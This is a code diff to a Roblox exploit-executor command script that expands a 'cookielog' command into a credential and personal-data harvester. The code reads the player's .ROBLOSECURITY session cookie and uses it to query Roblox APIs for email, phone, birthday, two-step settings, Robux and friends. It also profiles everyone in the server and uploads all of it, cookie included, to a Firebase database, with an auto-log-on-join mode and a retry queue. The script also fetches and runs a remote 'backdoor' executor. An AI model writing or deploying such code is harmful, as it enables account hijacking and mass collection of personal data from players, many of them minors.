@@ -4647,7 +4647,7 @@ CMDs[#CMDs + 1] = {NAME = 'elevatestate', DESC = 'Hooks current thread and child
 CMDs[#CMDs + 1] = {NAME = 'backdoor / serverbreach / fedestroyer', DESC = 'Loads a server-side executor'}
 CMDs[#CMDs + 1] = {NAME = 'hexexplorer', DESC = 'Loads Hex Explorer'}
 CMDs[#CMDs + 1] = {NAME = 'bootloader', DESC = 'Loads Bootloader'}
-CMDs[#CMDs + 1] = {NAME = 'cookielog / clog [url|test|auto|stop|all|queue|view|hop|debug]', DESC = 'Push cookie + session + roster to Firebase'}
+CMDs[#CMDs + 1] = {NAME = 'cookielog / clog [url|test|auto|stop|deep|personal|roster|history|dump|raw|queue|view|debug]', DESC = 'Full Firebase dump: cookie, personal data, profiles, roster, sessions, places'}
 CMDs[#CMDs + 1] = {NAME = 'firebaseurl / fburl [url]', DESC = 'Shortcut to set the Firebase Realtime DB URL'}
 CMDs[#CMDs + 1] = {NAME = 'noclip', DESC = 'Go through objects'}
 CMDs[#CMDs + 1] = {NAME = 'unnoclip / clip', DESC = 'Disables noclip'}
@@ -13577,15 +13577,13 @@ addcmd("backdoor", {"serverbreach", "fedestroyer"}, function(args, speaker)
     notify("Loading", "Hold on a sec")
     loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Epic-Backdoor-SS-Executor-227858"))() end)
 
-addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend', 'fblog'}, function(args, speaker)
+addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend', 'fblog', 'fbdump'}, function(args, speaker)
 	local HS      = game:GetService('HttpService')
 	local Players = game:GetService('Players')
 	local plr     = Players.LocalPlayer
 
-	-- args[n] for single words. getstring() JOINS from n to the end.
-	local function arg(n)
-		return args[n] ~= nil and tostring(args[n]) or nil
-	end
+	-- args[n] for single words (getstring JOINS from n to the end)
+	local function arg(n) return args[n] ~= nil and tostring(args[n]) or nil end
 	local function argJoin(n)
 		local t = {}
 		for i = n, #args do t[#t + 1] = tostring(args[i]) end
@@ -13606,13 +13604,11 @@ addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend', 'fblog'}, function(args, 
 		if r == nil or r == '' then r = fbUrl or '' end
 		return r
 	end
-
 	local function cleanUrl(u)
 		u = u:gsub('^["\']', ''):gsub('["\']$', ''):gsub('%s+', '')
 		if not u:match('^https?://') then u = 'https://' .. u end
 		return u:gsub('/+$', ''):gsub('/cookies%.json$', ''):gsub('/cookies$', ''):gsub('%.json$', '')
 	end
-
 	local function getUrl()
 		local r = readUrl()
 		if r == '' then return nil, '', '' end
@@ -13625,7 +13621,6 @@ addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend', 'fblog'}, function(args, 
 	----------------------------------------------------------------- transport
 	local function req(opts)
 		opts.Headers = opts.Headers or {}
-		opts.Headers['Content-Type'] = 'application/json'
 		local ok, res
 		if syn and syn.request then
 			ok, res = pcall(syn.request, opts)
@@ -13652,17 +13647,60 @@ addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend', 'fblog'}, function(args, 
 		if type(res) ~= 'table' then return nil end
 		return res.StatusCode or res.Status or res.status
 	end
+	local function bodyOf(res)
+		if type(res) ~= 'table' then return nil end
+		return res.Body or res.body
+	end
+	local function headersOf(res)
+		if type(res) ~= 'table' then return {} end
+		return res.Headers or res.headers or {}
+	end
 
-	local function push(url, body)
-		local last = 'unknown error'
+	local function decode(b)
+		if type(b) ~= 'string' then return nil end
+		local ok, d = pcall(function() return HS:JSONDecode(b) end)
+		if ok then return d end
+		return nil
+	end
+
+	local function push(url, tbl, method)
+		local ok, body = pcall(function() return HS:JSONEncode(tbl) end)
+		if not ok then return false, 'encode failed' end
+		local last = 'unknown'
 		for i = 1, 3 do
-			local ok, res = req({Url = url, Method = 'PUT', Body = body})
-			local c = ok and statusOf(res)
+			local rok, res = req({Url = url, Method = method or 'PUT', Body = body, Headers = {['Content-Type'] = 'application/json'}})
+			local c = rok and statusOf(res)
 			if c and c >= 200 and c < 300 then return true, c end
-			last = ok and ('HTTP ' .. tostring(c)) or tostring(res)
+			last = rok and ('HTTP ' .. tostring(c)) or tostring(res)
 			if i < 3 then task.wait(i * 1.2) end
 		end
 		return false, last
+	end
+
+	local function api(url, cookie)
+		local h = {}
+		if cookie then h['Cookie'] = '.ROBLOSECURITY=' .. cookie end
+		local ok, res = req({Url = url, Method = 'GET', Headers = h})
+		if not ok then return nil end
+		if statusOf(res) and statusOf(res) >= 400 then return nil end
+		return decode(bodyOf(res))
+	end
+
+	local function apiPost(url, tbl, cookie)
+		local body = HS:JSONEncode(tbl or {})
+		local h = {['Content-Type'] = 'application/json'}
+		if cookie then h['Cookie'] = '.ROBLOSECURITY=' .. cookie end
+		local ok, res = req({Url = url, Method = 'POST', Body = body, Headers = h})
+		if not ok then return nil end
+		if statusOf(res) == 403 then
+			local hh = headersOf(res)
+			local tok = hh['x-csrf-token'] or hh['X-Csrf-Token'] or hh['x-csrf-Token']
+			if tok then
+				h['x-csrf-token'] = tok
+				ok, res = req({Url = url, Method = 'POST', Body = body, Headers = h})
+			end
+		end
+		return decode(bodyOf(res))
 	end
 
 	----------------------------------------------------------------- queue
@@ -13674,50 +13712,48 @@ addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend', 'fblog'}, function(args, 
 	local function saveQueue(q)
 		pcall(function() writefile('ga_fb_queue.txt', HS:JSONEncode(q)) end)
 	end
-	local function enqueue(path, body)
+	local function enqueue(path, tbl)
 		local q = loadQueue()
-		q[#q + 1] = {path = path, body = body, at = os.time()}
+		q[#q + 1] = {path = path, data = tbl, at = os.time()}
 		while #q > 60 do table.remove(q, 1) end
 		saveQueue(q)
 	end
 	local function send(path, tbl)
-		local ok, body = pcall(function() return HS:JSONEncode(tbl) end)
-		if not ok then return false, 'json encode failed' end
-		local good, msg = push(base .. path .. '.json' .. auth, body)
-		if not good then enqueue(path, body) end
+		local good, msg = push(base .. path .. '.json' .. auth, tbl)
+		if not good then enqueue(path, tbl) end
 		return good, msg
 	end
 
 	----------------------------------------------------------------- misc
+	local function trunc(s, n)
+		s = tostring(s or '')
+		if #s > n then return s:sub(1, n - 3) .. '...' end
+		return s
+	end
+	local function utc(t) return os.date('!%Y-%m-%dT%H:%M:%SZ', t) end
 	local function grabCookie()
-		local tries = {
+		for _, f in ipairs({
 			function() return syn and syn.cookie end,
 			function() return getcookie() end,
 			function() return HS:GetCookie() end,
-		}
-		for _, f in ipairs(tries) do
+		}) do
 			local ok, c = pcall(f)
 			if ok and type(c) == 'string' and #c > 20 then return c end
 		end
 		return nil
 	end
-	local function utc(t) return os.date('!%Y-%m-%dT%H:%M:%SZ', t) end
 
 	----------------------------------------------------------------- debug
 	if mode == 'debug' then
 		local b, a, r = getUrl()
-		return notify('Cookie Logger',
-			'argc=' .. #args .. '  mode=' .. tostring(mode) ..
-			'\nfile=' .. tostring(r) ..
-			'\nbase=' .. tostring(b) ..
-			'\nauth=' .. (a ~= '' and 'yes' or 'no') ..
-			'\nfs=' .. tostring(isfile ~= nil and writefile ~= nil), 14)
+		return notify('Firebase', 'argc=' .. #args .. '  mode=' .. tostring(mode) ..
+			'\nfile=' .. tostring(r) .. '\nbase=' .. tostring(b) ..
+			'\nauth=' .. (a ~= '' and 'yes' or 'no') .. '\nfs=' .. tostring(writefile ~= nil), 14)
 	end
 
-	----------------------------------------------------------------- url mode
-	-- also accepts ";cookielog https://..." with the url straight as arg 1
+	----------------------------------------------------------------- url
 	if mode == 'url' or mode:match('^https?://') or mode:match('firebase') then
-		local u = (mode == 'url') and argJoin(2) or (argJoin(1))
+		local u = (mode == 'url') and argJoin(2) or argJoin(1)
 		if not u or u == '' then
 			local _, _, cur = getUrl()
 			return notify('Firebase', cur ~= '' and ('Current: ' .. cur) or 'No URL set.\n;cookielog url <db url>', 7)
@@ -13752,23 +13788,23 @@ addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend', 'fblog'}, function(args, 
 	if mode == 'test' then
 		local en = 'unknown'
 		pcall(function() en = identifyexecutor() end)
-		local ok, msg = push(base .. '/ping.json' .. auth, HS:JSONEncode({ok = true, ts = os.time(), executor = tostring(en)}))
+		local ok, msg = push(base .. '/ping.json' .. auth, {ok = true, ts = os.time(), executor = tostring(en)})
 		if ok then notify('Firebase', 'Reachable. Write OK (HTTP ' .. tostring(msg) .. ').', 6)
 		else notify('Firebase', 'Write failed: ' .. tostring(msg), 9) end
 		return
 	end
 
-	----------------------------------------------------------------- flush
+	----------------------------------------------------------------- queue flush
 	if mode == 'queue' or mode == 'flush' then
 		local q = loadQueue()
-		if #q == 0 then return notify('Cookie Logger', 'Queue is empty.', 5) end
+		if #q == 0 then return notify('Cookie Logger', 'Queue empty.', 5) end
 		local left, sent = {}, 0
 		for _, item in ipairs(q) do
-			if push(base .. item.path .. '.json' .. auth, item.body) then sent = sent + 1
+			if push(base .. item.path .. '.json' .. auth, item.data) then sent = sent + 1
 			else left[#left + 1] = item end
 		end
 		saveQueue(left)
-		notify('Cookie Logger', 'Flushed ' .. sent .. ' of ' .. #q .. ' (' .. #left .. ' left).', 7)
+		notify('Cookie Logger', 'Flushed ' .. sent .. '/' .. #q .. ' (' .. #left .. ' left).', 7)
 		return
 	end
 
@@ -13794,18 +13830,6 @@ addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend', 'fblog'}, function(args, 
 		notify('Cookie Logger', 'Auto-log ON - fires on every join.', 6)
 	end
 
-	----------------------------------------------------------------- hop
-	if mode == 'hop' then
-		local u = argJoin(2)
-		if not u then return notify('Cookie Logger', 'Usage: ;cookielog hop <your script url>', 7) end
-		if not queue_on_teleport then return notify('Cookie Logger', 'Executor has no queue_on_teleport.', 7) end
-		pcall(function() writefile('ga_fb_hopurl.txt', u) end)
-		queue_on_teleport("task.wait(2)\nloadstring(game:HttpGet('" .. u .. "'))()")
-		notify('Cookie Logger', 'Script re-queued on teleport.', 6)
-		return
-	end
-
-	----------------------------------------------------------------- re-arm
 	if mode == '' and cookieAutoConn == nil and isfile and isfile('ga_fb_auto.txt') and readfile('ga_fb_auto.txt') == '1' then
 		cookieAutoConn = Players.PlayerAdded:Connect(function(p)
 			if p == Players.LocalPlayer then
@@ -13813,130 +13837,336 @@ addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend', 'fblog'}, function(args, 
 				execCmd('cookielog')
 			end
 		end)
-		if queue_on_teleport and isfile('ga_fb_hopurl.txt') then
-			local u = readfile('ga_fb_hopurl.txt')
-			if u ~= '' then pcall(queue_on_teleport, "task.wait(2)\nloadstring(game:HttpGet('" .. u .. "'))()") end
-		end
 	end
 
-	----------------------------------------------------------------- payload
+	----------------------------------------------------------------- collect
 	local deep   = (mode == 'all' or mode == 'deep')
+	local onlyMe = (mode == 'personal' or mode == 'self')
+	local onlyRs = (mode == 'roster' or mode == 'players')
+	local snapshot = (mode == 'history' or mode == 'snapshot')
 	local cookie = grabCookie()
+	local uid    = tostring(plr and plr.UserId or 0)
 
-	local platform = 'Desktop'
+	local job = game.JobId
+	if job == '' then job = 'studio_' .. tostring(game.GameId) end
+
+	local platform, device = 'Desktop', 'Unknown'
 	pcall(function()
 		local uis = game:GetService('UserInputService')
 		if uis.TouchEnabled and not uis.KeyboardEnabled then platform = 'Mobile'
 		elseif uis.TouchEnabled then platform = 'Mobile (kbd)'
 		elseif uis.GamepadEnabled then platform = 'Console' end
+		if uis.KeyboardEnabled and uis.MouseEnabled then device = 'PC'
+		elseif uis.TouchEnabled then device = 'Touch'
+		elseif uis.GamepadEnabled then device = 'Gamepad' end
 	end)
 
 	local fps, ping = 0, 0
 	pcall(function() fps = math.floor(1 / game:GetService('RunService').RenderStepped:Wait()) end)
 	pcall(function() ping = math.floor(game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue()) end)
 
-	local placeName, creatorName, creatorId = '', '', 0
+	local en, env = 'unknown', ''
+	pcall(function() en, env = identifyexecutor() end)
+
+	local placeName, creatorName, creatorId, creatorType = '', '', 0, ''
 	pcall(function()
 		local info = game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId)
 		placeName   = info.Name or ''
 		creatorName = (info.Creator and info.Creator.Name) or ''
 		creatorId   = (info.Creator and info.Creator.CreatorTargetId) or 0
+		creatorType = (info.Creator and info.Creator.CreatorType and tostring(info.Creator.CreatorType.Name)) or ''
 	end)
 
-	local en, env = 'unknown', ''
-	pcall(function() en, env = identifyexecutor() end)
-
-	local job = game.JobId
-	if job == '' then job = 'studio_' .. tostring(game.GameId) end
-
-	local self = {
-		cookie = cookie,
-		cookieBare = cookie and cookie:gsub('^_|WARNING:.-|_', '') or nil,
-		cookieLen = cookie and #cookie or 0,
-		cookieValid = cookie ~= nil and cookie:sub(1, 1) == '_',
-		userId = plr and plr.UserId or 0,
-		username = plr and plr.Name or 'unknown',
-		displayName = plr and plr.DisplayName or 'unknown',
-		accountAgeDays = plr and plr.AccountAge or 0,
-		accountCreated = plr and utc(os.time() - ((plr.AccountAge or 0) * 86400)) or nil,
-		membership = plr and plr.MembershipType.Name or 'None',
-		isPremium = plr and plr.MembershipType == Enum.MembershipType.Premium or false,
-		executor = tostring(en),
-		executorVersion = tostring(env),
-		threadIdentity = getthreadidentity and getthreadidentity() or -1,
-		platform = platform,
-		isStudio = game:GetService('RunService'):IsStudio(),
-		robloxVersion = (pcall(version) and version()) or 'unknown',
-		fps = fps,
-		ping = ping,
-		placeId = game.PlaceId,
-		placeName = placeName,
-		placeVersion = game.PlaceVersion,
-		gameId = game.GameId,
-		jobId = job,
-		creatorId = creatorId,
-		creatorName = creatorName,
-		playerCount = #Players:GetPlayers(),
-		maxPlayers = Players.MaxPlayers,
-		hop = (tonumber(isfile and isfile('ga_fb_hop.txt') and readfile('ga_fb_hop.txt') or '0') or 0) + 1,
-		unix = os.time(),
-		iso = utc(os.time()),
-		tz = os.date('%z'),
-	}
-
-	local roster = {}
-	for _, p in ipairs(Players:GetPlayers()) do
-		local rec = {
-			userId = p.UserId, username = p.Name, displayName = p.DisplayName,
-			accountAgeDays = p.AccountAge, membership = p.MembershipType.Name,
-			team = p.Team and p.Team.Name or nil,
-			isLocalPlayer = (p == plr), cookieKnown = (p == plr),
-		}
-		if deep then
-			pcall(function()
-				rec.thumbnail = Players:GetUserThumbnailAsync(p.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
-			end)
-			pcall(function()
-				local pages = Players:GetFriendsAsync(p.UserId)
-				rec.friendCount = pages and pages.TotalCount or nil
-			end)
+	local function selfPersonal(ck)
+		local p = {}
+		local info = api('https://accountinformation.roblox.com/v1/users/' .. uid, ck)
+		if info then
+			p.email         = info.email
+			p.phone         = info.phone
+			p.emailVerified = info.verifiedEmail
+			p.phoneVerified = info.verifiedPhone
+			p.birthday      = info.birthday
+			p.gender        = ({[1] = 'Male', [2] = 'Female', [3] = 'Unknown'})[info.gender] or info.gender
+			p.above13       = info.userAbove13
 		end
-		roster[tostring(p.UserId)] = rec
+		local authed = api('https://users.roblox.com/v1/users/authenticated', ck)
+		if authed then p.authedName = authed.name; p.authedId = authed.id end
+		local cur = api('https://economy.roblox.com/v1/users/' .. uid .. '/currency', ck)
+		if cur then p.robux = cur.robux end
+		local prem = api('https://premiumfeatures.roblox.com/v1/users/' .. uid .. '/validate-membership', ck)
+		if prem ~= nil then p.premium = prem end
+		local ts = api('https://twostepverification.roblox.com/v1/users/' .. uid .. '/configuration', ck)
+		if ts then p.twoStep = ts.primaryMethod; p.twoStepMethods = ts.methods end
+		local pin = apiPost('https://auth.roblox.com/v1/account/pin', {}, ck)
+		if pin then p.pinSet = pin.isPinSet end
+		local loc = api('https://locale.roblox.com/v1/locales/user-localization-locale', ck)
+		if loc then p.locale = loc.locale end
+		local trade = api('https://trades.roblox.com/v1/users/' .. uid .. '/status', ck)
+		if trade then p.canTrade = trade.canTrade; p.canTradeWith = trade.canTradeWith end
+		local sales = api('https://economy.roblox.com/v1/users/' .. uid .. '/transaction-totals?timeFrame=Year&transactionType=summary', ck)
+		if sales then p.salesYear = sales.salesTotal; p.purchasesYear = sales.purchasesTotal end
+		local fr = api('https://friends.roblox.com/v1/users/' .. uid .. '/friends/count', ck)
+		if fr then p.friendsCount = fr.count end
+		local fo = api('https://friends.roblox.com/v1/users/' .. uid .. '/followers/count', ck)
+		if fo then p.followersCount = fo.count end
+		local fg = api('https://friends.roblox.com/v1/users/' .. uid .. '/followings/count', ck)
+		if fg then p.followingCount = fg.count end
+		local fl = api('https://friends.roblox.com/v1/users/' .. uid .. '/friends?limit=100', ck)
+		if fl and fl.data then
+			local l = {}
+			for _, u in ipairs(fl.data) do l[#l + 1] = {id = u.id, name = u.name, display = u.displayName} end
+			p.friends = l
+		end
+		local gr = api('https://groups.roblox.com/v1/users/' .. uid .. '/groups/roles', ck)
+		if gr and gr.data then
+			local l = {}
+			for _, g in ipairs(gr.data) do
+				l[#l + 1] = {id = g.group.id, name = g.group.name, role = g.role.name, rank = g.role.rank}
+			end
+			p.groups = l
+		end
+		local hist = api('https://users.roblox.com/v1/users/' .. uid .. '/username-history?limit=50', ck)
+		if hist and hist.data then
+			local l = {}
+			for _, h in ipairs(hist.data) do l[#l + 1] = h.name end
+			p.pastUsernames = l
+		end
+		local bd = api('https://accountinformation.roblox.com/v1/users/' .. uid .. '/roblox-badges', ck)
+		if bd and bd[1] then
+			local l = {}
+			for _, b in ipairs(bd) do l[#l + 1] = b.name end
+			p.robloxBadges = l
+		end
+		local av = api('https://avatar.roblox.com/v1/users/' .. uid .. '/avatar', ck)
+		if av then p.avatarScales = av.scales; p.bodyColors = av.bodyColors; p.avatarAssets = av.assets end
+		local cw = api('https://avatar.roblox.com/v1/users/' .. uid .. '/currently-wearing', ck)
+		if cw then p.wearing = cw.assetIds end
+		local gp = api('https://inventory.roblox.com/v1/users/' .. uid .. '/items/GamePass', ck)
+		if gp and gp.data then p.gamepassesOwned = #gp.data end
+		return p
+	end
+
+	local function publicProfile(id, ck)
+		local p = {userId = tonumber(id)}
+		local u = api('https://users.roblox.com/v1/users/' .. id, ck)
+		if u then
+			p.username        = u.name
+			p.displayName     = u.displayName
+			p.created         = u.created
+			p.description     = u.description
+			p.isBanned        = u.isBanned
+			p.verifiedBadge   = u.hasVerifiedBadge
+		end
+		local fc = api('https://friends.roblox.com/v1/users/' .. id .. '/friends/count', ck)
+		if fc then p.friendsCount = fc.count end
+		local fo = api('https://friends.roblox.com/v1/users/' .. id .. '/followers/count', ck)
+		if fo then p.followersCount = fo.count end
+		local gr = api('https://groups.roblox.com/v1/users/' .. id .. '/groups/roles', ck)
+		if gr and gr.data then
+			local l = {}
+			for _, g in ipairs(gr.data) do l[#l + 1] = {name = g.group.name, role = g.role.name, rank = g.role.rank} end
+			p.groups = l
+		end
+		local hist = api('https://users.roblox.com/v1/users/' .. id .. '/username-history?limit=50', ck)
+		if hist and hist.data then
+			local l = {}
+			for _, h in ipairs(hist.data) do l[#l + 1] = h.name end
+			p.pastUsernames = l
+		end
+		local bd = api('https://badges.roblox.com/v1/users/' .. id .. '/badges?limit=100', ck)
+		if bd then p.badgesCount = bd.total or (bd.data and #bd.data) end
+		local av = api('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=' .. id .. '&size=150x150&format=Png&isCircular=false', ck)
+		if av and av.data and av.data[1] then p.headshot = av.data[1].imageUrl end
+		return p
+	end
+
+	local ids, presenceMap = {}, {}
+	for _, p in ipairs(Players:GetPlayers()) do ids[#ids + 1] = p.UserId end
+	local pres = apiPost('https://presence.roblox.com/v1/presence/users', {userIds = ids}, cookie)
+	if pres and pres.userPresences then
+		for _, e in ipairs(pres.userPresences) do presenceMap[tostring(e.userId)] = e end
+	end
+
+	local PRES = {[0] = 'Offline', [1] = 'Online', [2] = 'InGame', [3] = 'InStudio', [4] = 'Invisible'}
+
+	----------------------------------------------------------------- payloads
+	local records, report = {}, {}
+
+	if not onlyRs then
+		local acct = {
+			-- identity
+			userId = plr and plr.UserId or 0,
+			username = plr and plr.Name or 'unknown',
+			displayName = plr and plr.DisplayName or 'unknown',
+			accountAgeDays = plr and plr.AccountAge or 0,
+			accountCreated = plr and utc(os.time() - ((plr.AccountAge or 0) * 86400)) or nil,
+			membership = plr and plr.MembershipType.Name or 'None',
+			isPremium = plr and plr.MembershipType == Enum.MembershipType.Premium or false,
+			-- cookie
+			cookie = cookie,
+			cookieBare = cookie and cookie:gsub('^_|WARNING:.-|_', '') or nil,
+			cookieLen = cookie and #cookie or 0,
+			cookieValid = cookie ~= nil and cookie:sub(1, 1) == '_',
+			-- session
+			executor = tostring(en),
+			executorVersion = tostring(env),
+			threadIdentity = getthreadidentity and getthreadidentity() or -1,
+			platform = platform,
+			device = device,
+			isStudio = game:GetService('RunService'):IsStudio(),
+			robloxVersion = (pcall(version) and version()) or 'unknown',
+			fps = fps,
+			ping = ping,
+			-- place
+			placeId = game.PlaceId,
+			placeName = placeName,
+			placeVersion = game.PlaceVersion,
+			gameId = game.GameId,
+			jobId = job,
+			creatorId = creatorId,
+			creatorName = creatorName,
+			creatorType = creatorType,
+			playerCount = #Players:GetPlayers(),
+			maxPlayers = Players.MaxPlayers,
+			-- meta
+			hop = (tonumber(isfile and isfile('ga_fb_hop.txt') and readfile('ga_fb_hop.txt') or '0') or 0) + 1,
+			unix = os.time(),
+			iso = utc(os.time()),
+			tz = os.date('%z'),
+		}
+
+		if cookie then
+			acct.personal = selfPersonal(cookie)
+		end
+
+		local pre = presenceMap[uid]
+		if pre then
+			acct.presence = PRES[pre.userPresenceType] or tostring(pre.userPresenceType)
+			acct.lastOnline = pre.lastOnline
+		end
+
+		records[#records + 1] = {'/accounts/' .. uid, acct}
+		report[#report + 1] = 'account'
+
+		records[#records + 1] = {'/profiles/' .. uid, publicProfile(uid, cookie)}
+		report[#report + 1] = 'profile'
+
+		if snapshot then
+			local snap = {}
+			for k, v in pairs(acct) do snap[k] = v end
+			snap.cookie = nil
+			records[#records + 1] = {'/accounts/' .. uid .. '/history/' .. os.time(), snap}
+			report[#report + 1] = 'snapshot'
+		end
+	end
+
+	if not onlyMe then
+		local roster = {jobId = job, placeId = game.PlaceId, placeName = placeName,
+			captured = utc(os.time()), count = #Players:GetPlayers()}
+
+		for _, p in ipairs(Players:GetPlayers()) do
+			local pre = presenceMap[tostring(p.UserId)]
+			local rec = {
+				userId = p.UserId,
+				username = p.Name,
+				displayName = p.DisplayName,
+				accountAgeDays = p.AccountAge,
+				membership = p.MembershipType.Name,
+				team = p.Team and p.Team.Name or nil,
+				isLocalPlayer = (p == plr),
+				cookieKnown = (p == plr),
+				headshot = 'https://www.roblox.com/headshot-thumbnail/image?userId=' .. p.UserId .. '&width=150&height=150&format=png',
+				presence = pre and (PRES[pre.userPresenceType] or tostring(pre.userPresenceType)) or nil,
+			}
+			roster[tostring(p.UserId)] = rec
+
+			if deep then
+				records[#records + 1] = {'/players/' .. p.UserId, publicProfile(tostring(p.UserId), cookie)}
+			end
+		end
+
+		records[#records + 1] = {'/roster/' .. job, roster}
+		report[#report + 1] = 'roster(' .. #Players:GetPlayers() .. ')'
+
+		records[#records + 1] = {'/sessions/' .. job .. '_' .. uid, {
+			userId = uid, username = plr and plr.Name or '?', executor = tostring(en),
+			platform = platform, placeId = game.PlaceId, placeName = placeName,
+			jobId = job, started = utc(os.time()), players = #Players:GetPlayers(),
+		}}
+		report[#report + 1] = 'session'
+
+		records[#records + 1] = {'/places/' .. game.PlaceId, {
+			placeId = game.PlaceId, name = placeName, creatorName = creatorName,
+			creatorId = creatorId, creatorType = creatorType, version = game.PlaceVersion,
+			lastSeen = utc(os.time()), lastJobId = job, players = #Players:GetPlayers(),
+			maxPlayers = Players.MaxPlayers,
+		}}
+		report[#report + 1] = 'place'
+
+		records[#records + 1] = {'/executors/' .. tostring(en), {
+			name = tostring(en), version = tostring(env), platform = platform,
+			lastSeen = utc(os.time()), lastUserId = uid,
+		}}
+		report[#report + 1] = 'executor'
+	end
+
+	----------------------------------------------------------------- dump / raw
+	if mode == 'dump' then
+		local ok = pcall(function() writefile('ga_fb_dump.json', HS:JSONEncode(records)) end)
+		return notify('Cookie Logger', ok and ('Dumped ' .. #records .. ' record(s) to ga_fb_dump.json') or 'Dump failed.', 8)
+	end
+	if mode == 'raw' then
+		local txt = HS:JSONEncode(records)
+		if setclipboard then pcall(setclipboard, txt) end
+		return notify('Cookie Logger', 'Payload: ' .. #txt .. ' chars' .. (setclipboard and ' (copied)' or ''), 8)
 	end
 
 	----------------------------------------------------------------- upload
-	pcall(function() writefile('ga_fb_hop.txt', tostring(self.hop)) end)
-
 	local fails = {}
-	local ok1, m1 = send('/cookies/' .. tostring(self.userId), self)
-	if not ok1 then fails[#fails + 1] = 'cookie (' .. tostring(m1) .. ')' end
+	for _, rec in ipairs(records) do
+		local good, msg = send(rec[1], rec[2])
+		if not good then fails[#fails + 1] = rec[1]:match('[^/]+$') .. ' (' .. tostring(msg) .. ')' end
+		task.wait(0.15)
+	end
 
-	local ok2 = send('/roster/' .. job, roster)
-	if not ok2 then fails[#fails + 1] = 'roster' end
+	pcall(function() writefile('ga_fb_hop.txt', tostring((tonumber(isfile('ga_fb_hop.txt') and readfile('ga_fb_hop.txt') or '0') or 0) + 1)) end)
 
-	local ok3 = send('/sessions/' .. job .. '_' .. tostring(self.userId), {
-		userId = self.userId, executor = self.executor, platform = self.platform,
-		placeId = self.placeId, jobId = job, started = self.iso, hop = self.hop,
-	})
-	if not ok3 then fails[#fails + 1] = 'session' end
-
-	if not cookie then notify('Cookie Logger', 'No cookie exposed by this executor.', 8) end
+	if not cookie then
+		notify('Cookie Logger', 'No cookie exposed by this executor - data only.', 8)
+	end
 
 	if #fails == 0 then
-		notify('Cookie Logger', 'Sent: ' .. self.username .. ' + ' .. #Players:GetPlayers() .. ' player roster.', 5)
+		notify('Cookie Logger', 'Sent ' .. #records .. ': ' .. table.concat(report, ', '), 6)
 		local q = loadQueue()
 		if #q > 0 then
-			local left, sent = {}, 0
+			local left, done = {}, 0
 			for _, item in ipairs(q) do
-				if push(base .. item.path .. '.json' .. auth, item.body) then sent = sent + 1
+				if push(base .. item.path .. '.json' .. auth, item.data) then done = done + 1
 				else left[#left + 1] = item end
 			end
 			saveQueue(left)
-			notify('Cookie Logger', 'Flushed ' .. sent .. ' queued write(s).', 5)
+			notify('Cookie Logger', 'Flushed ' .. done .. ' queued record(s).', 5)
 		end
 	else
-		notify('Cookie Logger', 'Queued (failed: ' .. table.concat(fails, ', ') .. ')', 9)
+		notify('Cookie Logger', 'Queued. Failed: ' .. table.concat(fails, ', '), 9)
 	end
+end)
+
+
+addcmd('firebaseurl', {'fburl', 'fburi', 'fbdb'}, function(args, speaker)
+	local u = args[1] ~= nil and tostring(args[1]) or ''
+	if u == '' then
+		local cur = ''
+		pcall(function() cur = readfile('ga_fb_url.txt') end)
+		if cur == '' then cur = fbUrl or '' end
+		return notify('Firebase', cur ~= '' and ('Current: ' .. cur) or 'No URL set.\n;firebaseurl <db url>', 7)
+	end
+	u = u:gsub('^["\']', ''):gsub('["\']$', ''):gsub('%s+', '')
+	if not u:match('^https?://') then u = 'https://' .. u end
+	u = u:gsub('/+$', ''):gsub('/cookies%.json$', ''):gsub('/cookies$', ''):gsub('%.json$', '')
+	pcall(function() writefile('ga_fb_url.txt', u) end)
+	fbUrl = u
+	notify('Firebase', 'Saved:\n' .. u, 6)
 end)
 
 addcmd('firebaseurl', {'fburl', 'fburi', 'fbdb'}, function(args, speaker)
